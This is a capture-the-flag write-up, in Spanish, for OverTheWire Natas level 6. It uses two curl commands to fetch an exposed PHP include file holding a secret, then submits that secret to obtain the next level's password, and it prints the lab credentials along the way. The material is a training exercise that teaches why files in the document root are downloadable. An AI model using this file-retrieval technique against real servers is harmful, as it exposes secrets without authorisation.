# Natas Level06

## Descripción
> **Level Goal (natas6.natas.labs.overthewire.org):** Un formulario pide un "secreto" (`Input secret`) y compara lo enviado contra una variable `$secret` definida en el servidor. El enlace "View sourcecode" muestra el PHP, pero el valor real de `$secret` aparece censurado en esa vista... aunque se incluye desde otro archivo.

## Solución
El código fuente mostrado hace `include "includes/secret.inc";` y compara `$secret == $_POST['secret']`. La vista `index-source.html` censura la variable, pero el archivo incluido (`includes/secret.inc`) es servido directamente por el propio Apache si se pide por su ruta, ya que PHP solo lo "incluye" en tiempo de ejecución — el archivo en sí sigue siendo un recurso estático accesible.

```bash
curl -s -u natas6:7mhjtShJAcld2NYbKHEadnhEwRn2P8VT http://natas6.natas.labs.overthewire.org/includes/secret.inc
# $secret = "FOEIUWGHFEEUHOFUOIU";

curl -s -u natas6:7mhjtShJAcld2NYbKHEadnhEwRn2P8VT \
  -d "submit=1&secret=FOEIUWGHFEEUHOFUOIU" \
  http://natas6.natas.labs.overthewire.org/index.php
# Access granted. The password for natas7 is B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0
```

## Notas adicionales
- Extensión `.inc` no es reconocida por Apache como "no servible" ni ejecutada como PHP salvo que la configuración lo indique explícitamente; por eso se devuelve como texto plano.
- Lección general: cualquier archivo dentro del document root es potencialmente descargable directamente, independientemente de que el flujo normal de la aplicación lo use solo vía `include`/`require`.

## Referencias
- Reto original: http://natas6.natas.labs.overthewire.org/
- Apoyo: https://www.php.net/manual/en/function.include.php (manual de PHP sobre `include`)
